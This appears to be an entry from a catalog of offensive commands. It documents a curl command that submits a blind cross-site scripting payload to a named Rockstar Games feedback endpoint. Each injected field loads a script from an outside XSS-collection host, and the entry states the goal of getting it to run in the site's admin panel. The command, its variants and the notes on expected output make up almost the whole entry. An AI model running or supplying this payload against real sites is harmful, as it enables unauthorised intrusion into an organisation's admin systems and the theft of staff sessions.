---
data: >-
  curl -X POST https://www.rockstargames.com/mouthoff/mouthoff/submit.json -d
  "name=\"\'><script src=https://abhartiya.xss.ht></script>'" -d
  "subject=\"\'><script src=https://abhartiya.xss.ht></script>'" -d
  "body=\"\'><script src=https://abhartiya.xss.ht></script>'" -d
  "email=test@gmail.com" -d "age=30" -d "category_id=1"
tags:
  - xss
  - http
  - post-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.947Z'
id: bdcc6b14-9c4d-4c15-9fec-9d89951828ba
verified: false
validated: true
submitted: true
---
# curl-submit-xss-payload

## Command

```bash
curl -X POST https://www.rockstargames.com/mouthoff/mouthoff/submit.json -d "name=\"\'><script src=https://abhartiya.xss.ht></script>'" -d "subject=\"\'><script src=https://abhartiya.xss.ht></script>'" -d "body=\"\'><script src=https://abhartiya.xss.ht></script>'" -d "email=test@gmail.com" -d "age=30" -d "category_id=1"
```

## Description

This command uses curl to submit a Blind XSS payload to the Rockstar Games feedback form endpoint via POST request. It injects the payload into name, subject, and body fields to maximize execution chances in the admin panel.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://www.rockstargames.com/mouthoff/mouthoff/submit.json` | Target endpoint URL | Yes |
| `-d "name=..."` | Form data for name field with XSS payload | Yes |
| `-d "subject=..."` | Form data for subject field with XSS payload | Yes |
| `-d "body=..."` | Form data for body field with XSS payload | Yes |
| `-d "email=test@gmail.com"` | Email field value | Yes |
| `-d "age=30"` | Age field value | Yes |
| `-d "category_id=1"` | Category ID field value | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.rockstargames.com/mouthoff/mouthoff/submit.json -d "name=\"\'><script src=https://abhartiya.xss.ht></script>'" -d "email=test@gmail.com"
```

### Advanced Usage

```bash
curl -X POST https://www.rockstargames.com/mouthoff/mouthoff/submit.json -d "name=\"\'><script src=https://abhartiya.xss.ht></script>'" -d "subject=\"\'><script src=https://abhartiya.xss.ht></script>'" -d "body=\"\'><script src=https://abhartiya.xss.ht></script>'" -d "email=test@gmail.com" -d "age=30" -d "category_id=1" -v
```

## Expected Output

A successful response might be a JSON object like {"success": true}, indicating the form was submitted. No immediate XSS execution is visible; check external payload host for confirmation.

## Related

- [[Related Procedure|procedures/Inject-Blind-XSS-Payload-into-Feedback-Form]]
